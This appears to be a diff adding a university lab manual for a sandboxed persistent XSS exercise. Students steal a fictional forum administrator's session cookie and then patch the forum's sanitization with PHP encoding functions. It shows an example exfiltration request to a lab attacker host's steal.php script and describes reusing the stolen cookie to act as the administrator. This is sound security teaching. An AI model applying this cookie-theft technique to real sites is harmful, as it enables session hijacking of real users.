@@ -1,0 +1,288 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+
+
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="robots" content="index,nofollow">
+
+<title>Exploits: Cross-Site Scripting (XSS)</title>
+
+<link rel="stylesheet" type="text/css" charset="utf-8" media="all" 
+href="../../css//common.css">
+<link rel="stylesheet" type="text/css" charset="utf-8" media="screen" 
+href="../../css//screen.css">
+</head><body dir="ltr" lang="en">
+
+<div id="page" dir="ltr" lang="en">
+<h1>Exploits: Cross-Site Scripting (XSS)</h1>
+<div class="author">Created by: Brandon Paulsen with Dr. Peter Peterson - &ltpahp@d.umn.edu&gt<br>
+</div>
+
+<!--
+<div class="due-date">Put your due date here if you are including the exercise in your class.</div>
+-->
+
+<div class="table-of-contents">
+<div class="table-of-contents-heading">Contents</div>
+<ol type="1">
+<li><a href="#overview">Overview</a>
+<li><a href="#seealso">See Also</a>
+<ol>
+	<li><a href="#inputvalandsan">Input Validation and Sanitization</a>
+	<ol>
+		<li><a href="#filtervar">filter_var()</a>
+		<li><a href="#htmlspecialchars">htmlspecialchars()</a>
+	</ol>
+</ol>
+<li><a href="#assignment">Assignment Instructions</a>
+
+<ol>
+   <li><a href="#setup">Setup</a>
+   <li><a href="#config">Experimental Configuration</a>
+   <li><a href="#sloths">Sloths Unlimited Web Forum</a>
+   <li><a href="#tools">Software Tools</a>
+   <li><a href="#routine">Changing the Sanitization Routine</a>
+   <li><a href="#reset">Resetting the Forum</a>
+   <li><a href="#exploit">How Will I Know If My Exploit Worked?</a>
+   <li><a href="#tasks">Tasks</a>
+</ol>
+
+<li><a href="#submission">Submission Instructions</a>
+
+<li><a href="#tarball101">Tarball 101</a>
+   <ol>
+		<li><a href="#howtomaketarball">How Do I Make a Tarball?</a>
+		<li><a href="#howtounziptarball">How Do I Unzip the Tarball I Just Made?</a>
+	</ol>
+
+
+</ol>
+</div>
+
+<span class="anchor" id="overview"></span> 
+<h2>Overview</h2>
+<p />
+
+<p />The purpose of this lab is to introduce you to the concept of Cross-Site Scripting (XSS). In this lab, you will use a Persistent Cross-Site Scripting attack against a web forum in order to steal the authentication cookie of an administrator and deface the forum. Then you will fix the flaw in the forum code, create a patch, and write about it.
+
+You should be familiar with the Unix command line, POSIX permissions, and basic programming. The exercise will also use C and HTTP, but at introductory levels.
+
+<p /><span class="anchor" id="inputvalandsan"></span> 
+<h3>Persistent Cross Site Scripting</h3>
+
+<p />Persistent Cross Site Scripting is an exploit where an attacker inserts malicious code or HTML into a persistent web page. Forums and “comment sections” are particularly vulnerable, especially when users are able to post data with arbitrary characters. The exploit occurs when arbitrary code (HTML and Javascript, for example) is simply “pasted in” to the display page -- think of a comment section or forum where post after post are concatenated together. If the user is able to include Javascript in the post, then, thanks to the <a href="https://en.wikipedia.org/wiki/Same-origin_policy" target="_blank">Same Origin Policy</a> the script will run as if it were part of the original webpage! Since it’s part of the original page, it can steal things like cookies (and potentially passwords that might be useful on other sites) and cause the browser to misbehave in other ways. We prevent XSS attacks by validating and sanitizing user input, similar to SQL injection. See the following section for more information on prevention. For more information, see the excellent XSS tutorial site, <a href="http://excess-xss.com/" target="_blank">http://excess-xss.com/</a>. You might also enjoy reading about XSS attacks in “24 Deadly Sins of Software Security,” where it is Sin #2.
+
+<div class="infobox">
+   <p><img src="idea.png" />
+      Hint: The type of XSS attack you’ll be performing is called a persistent XSS attack, as opposed to reflected or DOM-based attacks.
+   <p />
+</div>
+
+<p /><span class="anchor" id="seealso"></span> 
+<h2>See Also</h2>
+<p />The OWASP project has a <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">great writeup on XSS attacks</a>, including examples, that you may find useful. 
+<p />And again, the <a href="https://excess-xss.com/" target="_blank">Excess XSS site is a great resource including instructional information.</a> 
+
+<span class="anchor" id="inputvalandsan"></span> 
+<h3>Input Validation and Sanitization</h3>
+<p />One of your tasks is to patch an XSS vulnerability web forum that allows persistent Javascript to be included in forum posts. The default forum code doesn’t even attempt to strip HTML tags from the user’s posts. Improved code exists in the forum software (see below) and you’ll need to enable and attack each improvement (there are ways to circumvent them). In addition, the forum users sometimes have legitimate reasons to include input in their post that is HTML-like. For example, users like to make <a href="https://en.wikipedia.org/wiki/ASCII_art" target="_blank">ASCII art</a> and discuss code in various programming languages, so we cannot simply restrict forum posts to alphanumeric symbols. Instead, we want to allow users to include any printable characters in their posts in a way that removes any special meanings that the characters have in HTML. To do this, we convert special characters (such as ‘<’ or ‘>’) in the user’s input to their corresponding <a href="https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references" target="_blank">HTML encoding</a>. This will tell the browser to just display the special character rather than interpret it as part of the HTML.
+<p />Fortunately, most server-side scripting languages have several, several built in functions for validating and sanitizing string data. For this lab, we will focus on the PHP language, and we will be using its filtering functions to encode special characters in the user’s input. PHP has at least two functions for this: filter_var() and htmlspecialchars(). Generally, we want to use built in functions rather than home-brewed functions for the same reason we use well-known encryption algorithms rather than home-brewed algorithms. Information on these built-in functions is found below:
+
+<span class="anchor" id="filtervar"></span> 
+<h4>filter_var()</h4>
+<p />filter_var() takes a string to be filtered, a filter id that corresponds to one of PHP’s built-in filters, and an optional flag value. It returns the given string with the specified filter applied to it. The filters available for use are documented listed in the PHP documentation here: <a href="https://php.net/manual/en/filter.filters.sanitize.php" target="_blank">https://php.net/manual/en/filter.filters.sanitize.php</a>
+<p />And the documentation for filter_var itself is found here: <a href="https://php.net/manual/en/function.filter-var.php" target="_blank">https://php.net/manual/en/function.filter-var.php</a>
+
+<span class="anchor" id="htmlspecialchars"></span> 
+<h4>htmlspecialchars()</h4>
+<p />htmlspecialchars() works similarly to filter_var(). It takes a string as input and returns the same string with a static filter applied to it. The transformations and additional options for the function can be found here: <a href="https://php.net/manual/en/function.htmlspecialchars.php" target="_blank">https://php.net/manual/en/function.htmlspecialchars.php</a>
+
+<span class="anchor" id="assignment"></span> 
+<h2>Assignment Instructions</h2>
+<p />For years, the sloths and the bald eagles have coexisted in the plains of Mount Olympus under the treaty of Two’s Complement. As the sloths ranks expanded, Lord Dingwall, branch manager of the sloths, realized the need for better communication among his people. Thus he collaborated with the spider nation to create the web domain slothsunlimited.com. Unfortunately, Dingwall accidentally insulted the eagles toupees, precipitating the dissolution of the treaty and upsetting the balance of power in the greater Mount Olympus metropolitan area. Now, King Teshwan, chieftain of the eagles, bent on revenge, has decided to attack the sloths at the heart of their communication.
+
+<p />Your task, as King Teshwan, is to devastatingly embarrass the sloths by creating a category called “Eagles” on the website by performing a persistent XSS attack on the forum (i.e., by injecting javascript into the website). Dingwall obsessively rereads each thread on the forum (every 5 seconds or so) and his browser has an <strong>authentication cookie</strong> that keeps him logged in to the forum as an administrator. If Dingwall reads a malicious post containing Javascript in his browser, the Javascript in the post can access the authentication cookie in Dingwall’s browser (as allowed by the Same Origin Policy). Then, the same Javascript can exfiltrate (i.e., leak) this cookie value to Teshwan. Once Teshwan has the cookie, he can use it to perform tasks as Dingwall on the forum. While there are many ways you could do this, you only need to find one way.
+
+<p />The sloths will be so embarrassed by this that they will apologize to the eagles and hopefully come to peace again. Then, in the role of Lord Dingwall, you must patch the vulnerability exploited by King Teshwan by adding input sanitization to the forum code. 
+
+<div class="infobox">
+   <p><img src="idea.png" />
+      You will probably want to set up port forwarding for tunneling HTTP over ssh so you can test the web applications with a browser on your own desktop.
+   <p />
+</div>
+
+<h3 class="anchor" id="setup">Setup</h3>
+<ol>
+	<ol type="1"><li><p />If you don't have an account, follow the instructions <a href="https://docs.sphere-testbed.net/experimentation/classes/" target="_blank">here</a>.
+</li><li>Create an instance of this exercise by following the instructions <a href="https://docs.sphere-testbed.net/experimentation/classes/#working-on-assignments" target="_blank">here</a>, using <font color=red>xss</font> as Lab name.  Your topology will look like below:<p><img src="topo.png">.
+</li><li>After setting up the lab, access your <tt>server</tt> node. <p /></ol></ol><p />
+
+<div class="warning">
+   <p><img src="alert.png" /> <strong>Note:</strong> After running the installation script, it will finish running once it states <span style="font-family: monospace; font-size: 0.9rem;">"Successful page open!"</span> This is a script that will access all topics in the forum, and it’s important not to end this, as it runs the exploit for this lab. Simply open another terminal to SSH into the <span style="font-family: monospace; font-size: 0.9rem;">server</span> node.
+</div>
+
+<p />Make sure that you save your work as you go. See the instructions in the <a href="#submission">submission section</a> of this exercise for information about save and restore scripts. Make sure that you save any changes you make to the sourcecode, your patches, memos, etc. in your home directory so they are not lost when you swap out your experiment.
+
+<div class="infobox">
+   <p><img src="idea.png" />
+      Your XSS payload will need to obtain the forum authentication cookie value of any viewers and will also need to submit that value using a GET request to the steal.php script described under Experiment Configuration (below).
+   <p />
+</div><br>
+
+<h3 class="anchor" id="config">Experiment Configuration</h3>
+
+<img src="configsample.png" style="margin-left: auto; margin-right: auto; display: block; width: 50%; height: 50%;">
+
+<p />This experiment has two nodes: a client at 10.0.1.2 (King Teshwan’s computer) and a server at 10.0.1.1 (the host for slothsunlimited.com and Lord Dingwall’s personal computer). The URL for the forum is http://10.0.1.1/ (although if you use port forwarding it will be http://localhost:PORTNUM/). Lord Dingwall periodically accesses each topic on slothsunlimited.com using a <a href="http://blog.arhg.net/2009/10/what-is-headless-browser.html" target="_blank">headless web browser</a>. This means if you inject javascript into the forum, Dingwall’s browser will eventually execute it.
+
+<div class="infobox">
+   <p><img src="idea.png" />
+      <strong>Viewing the Forum From Your Computer:</strong>
+      <p /> If you have already setup port forwarding using the <span style="font-family: monospace;">port-forward.sh</span> script from <span style="font-family: monospace;">/share</span>, you may access the forum with this command:<br>
+
+      <p /> <center><span style="font-family: monospace; font-size: 1rem;">$ ssh -L 8080:server:80 proj-xdc-user</span></center>
+
+      <p /> where proj is your project name, xdc is the name of your XDC, and user is your Merge username.<br>
+
+      <p /> If you prefer to use the <span style="font-family: monospace; font-size: 0.8rem;">mrg</span> testbed tool, you may use the following commands:<br>
+
+      <p /> <center><span style="font-family: monospace; font-size: 1rem;">$ mrg login username</span></center>
+      <p /> <center><span style="font-family: monospace; font-size: 1rem;">$ mrg xdc ssh xdc.proj -L 8080:server:80</span></center>
+
+      <p /> ...where username is your Merge username, xdc is the name of your XDC, and proj is the name of your project.<br>
+
+      <p /> Once you have set up port forwarding with one of these methods, you can access the site using http://localhost:8080/index.php.
+
+      <p /> For more information regarding port forwarding, you may check out the <a href="https://docs.sphere-testbed.net/experimentation/port-forwarding/" target="_blank">Merge</a> documentation if you are using the <span style="font-family: monospace; font-size: 0.8rem;">mrg</span> CLI. Otherwise, you may view the documentation for <a href="https://github.com/eric56379/sphere-port-forwarding" target="_blank" style="font-family: monospace; font-size: 0.8rem;">port-forward.sh</a> instead.
+   <p />
+</div>
+
+<p />The sloths have written <strong>four sanitization functions</strong> located in /var/www/html/sanitize.php. The first is a “no sanitize” function, and the next three attempt to sanitize strings by stripping html tags in increasingly sophisticated ways. 
+
+<p />The injected Javascript should access Lord Dingwall’s authentication cookie for the forum and send it to Teshwan so that he can create the embarrassing “Eagles” category.
+
+<p />Teshwan’s computer is running an apache server which has a script called steal.php, located in /var/www/html/steal.php (with the URL <span style="font-family: monospace; font-size: 0.9rem;">http://10.0.1.2/steal.php</span>). This script takes a cgi parameter “cookie”, and crafts a request to slothsunlimited.com which will create the category “Eagles” using cookie’s value. The cookie parameter should be the entire cookie value (Ex: PHP_SESS=XYZ). Assuming the value of cookie is Dingwall’s session token, steal.php will handle the rest.
+
+<h3 class="anchor" id="sloths">Sloths Unlimited Web Forum</h3>
+<p />The sloths unlimited web forum code is located in /var/www/html on 10.0.1.1. It uses PHP to interface with a MySQL backend. You can access the backend by logging in as the user ‘root’ with the password ‘root’. (See the SQL lab for information on using the MySQL CLI).
+
+<h3 class="anchor" id="tools">Software Tools</h3>
+<p />No new software tools should be required for this exercise. For instructions on using the mysql client to look at the database for slothsunlimited.com, see the lab manual for the SQL Injection lab. Similarly, see previous lab manuals for instructions on using diff and patch.
+
+<h3 class="anchor" id="routine">Changing the Sanitization Routine</h3>
+<p />For instructions on setting up SSH tunneling, see SPHERE’s tutorial on <u>port forwarding</u>. The sanitization routines are located in /var/www/html/sanitize.php. Initially, all routines except the first one will be commented out. To change to a different routine, you only need to comment out the currently active routine, and uncomment the routine you want to enable. 
+
+<h3 class="anchor" id="reset">Resetting the Forum</h3>
+<p />You will want to reset the forum to its original state to ensure that your old payload isn’t triggering the exploit, rather than your current payload. To reset the forum’s state, run the script located in /lab/reset.sh.
+
+<div class="warning">
+   <p><img src="alert.png" /> Note that this script will destroy any payloads you submitted to the server.
+</div>
+
+<h3 class="anchor" id="exploit">How Will I Know If My Exploit Worked?</h3>
+
+<p />As mentioned before, there is a script running on the server which repeatedly opens every topic page it finds on the server. The script waits five seconds between each topic that it accesses. Initially, there are three topics on the forum, so if you inject a working exploit in one of these three topics, you should see the “Eagles” category appear on the homepage within 15 seconds. Any new topics you add will increase the time you have to wait to see your exploit work.
+
+<span class="anchor" id="tasks"></span>
+<h2>Tasks</h2>
+<ol>
+   <li>Your job is to write payloads that will defeat the first three sanitization functions. The fourth function is extra credit (10 points). Defeating entails submitting some payload to slothsunlimited.com anywhere on the website which steals Dingwall’s cookie and sends it to the steal.php script on Teshwan’s computer. Your exploit will probably make a request that looks like this:
+      <span style="font-family: monospace; font-size: 1rem;">http://10.0.1.2/steal.php?cookie=COOKIE_VALUE</span>
+   </li>
+
+   <li>
+      <p />Fix the flaws that allowed you to steal Dingwall’s session cookie by writing your own sanitize function in sanitize.php. Your function should not remove characters, but instead encode dangerous characters so that they will display properly but not be executed. 
+   </li>
+
+   <br><div class="infobox">
+      <p><img src="idea.png" />
+         PHP has built-in functions for encoding dangerous characters!
+      <p />
+   </div><br>
+
+   <li>
+      Create a patch against sanitize.php. 
+   </li>
+
+   <li>
+      Write two short memos, one from King Teshwan’s perspective to Lord Dingwall, describing how you defeated each of the sanitization routines and one from Lord Dingwall’s perspective to King Teshwan, apologizing for “Toupeegate” and explaining how the forum was patched to be immune from this attack.
+   </li>
+
+</ol>
+
+<span class="anchor" id="submission"></span> 
+<h2>Submission Instructions</h2>
+
+<p />Make a directory called xss with the following files:
+
+<ol>
+   <li>
+      The payloads used to exploit each sanitization routine (text files <span style="font-family: monospace; font-size: 1rem;">payload1, payload2, and payload3</span>).
+   </li>
+
+   <li>
+      Your sanitize.php patch (<span style="font-family: monospace; font-size: 1rem;">sanitize.php.patch</span>)
+   </li>
+
+   <li>
+      The two memos, <span style="font-family: monospace; font-size: 1rem;">attack-memo</span> and <span style="font-family: monospace; font-size: 1rem;">fix-memo</span> (1-2 paragraphs each) describing the attack and fix.
+   </li>
+</ol>
+
+<p />Make a tarball out of xss called xss.tar.gz and submit it via your course’s usual method. Don’t know how to make a tarball? Read on!
+
+<span class="anchor" id="tarball101"></span> 
+<h2>Tarball 101</h2>
+
+<span class="anchor" id="howtomaketarball"></span> 
+<h3>How Do I Make a Tarball?</h3>
+
+<p />To make a gzipped tarball, you first put all your files into a directory, and then you combine (tar) and compress (gzip) the file.
+
+<div class="warning">
+   <p><img src="alert.png" /> If you’re unfamiliar with moving files on the command line, please make a test tarball with dummy files so you don’t accidentally wreck your homework.
+</div>
+
+<p />Step-by-step instructions to make your own tarball:
+
+<ol>
+   <li>
+      Make a directory, e.g., using 
+      <p style="font-family: monospace; font-size: 1rem;">$ mkdir foo</p>
+   </li><br>
+
+   <li>
+      Make some files you want to compress (e.g., your homework). We can make some test files using 
+      <p style="font-family: monospace; font-size: 1rem;">$ touch a b c </p><br>
+      … which makes three empty files, a, b, and c.
+   </li><br>
+
+   <li>
+      Move those files into the directory we’re going to tar:
+      <p style="font-family: monospace; font-size: 1rem;">$ mv a foo</p>
+      <p style="font-family: monospace; font-size: 1rem;">$ mv b foo</p>
+      <p style="font-family: monospace; font-size: 1rem;">$ mv c foo</p><br>
+      <p>You could also do</p>
+      <p style="font-family: monospace; font-size: 1rem;">$ mv a b c foo</p>
+   </li><br>
+
+   <li>
+      Make a tarball out of the directory and it’s contents, by doing
+      <p style="font-family: monospace; font-size: 1rem;">$ tar cvzf foo.tar.gz foo</p><br>
+      That command says to tar with the options c (compress), v (verbose -- say what’s happening), z (compress), and f (“with the files specified on the command line”) and then you specify the compressed file to create and the directory to compress.
+   </li><br>
+</ol>
+
+<p />When finished, you’ll have a tarball: foo.tar.gz.<br>
+<p />So, for this project, make a directory called xss (or whatever).
+
+<span class="anchor" id="howtounziptarball"></span> 
+<h3>How Do I Unzip the Tarball I Just Made?</h3>
+<p />To unzip it, do:
+<p style="font-family: monospace; font-size: 1rem;">$ tar xvzf foo.tar.gz</p>
+
+<p />Where the only difference is the x, which means “extract.” Please note that if the directory foo/ exists, it will be overwritten.
+
+
+</div>
+</body></html>
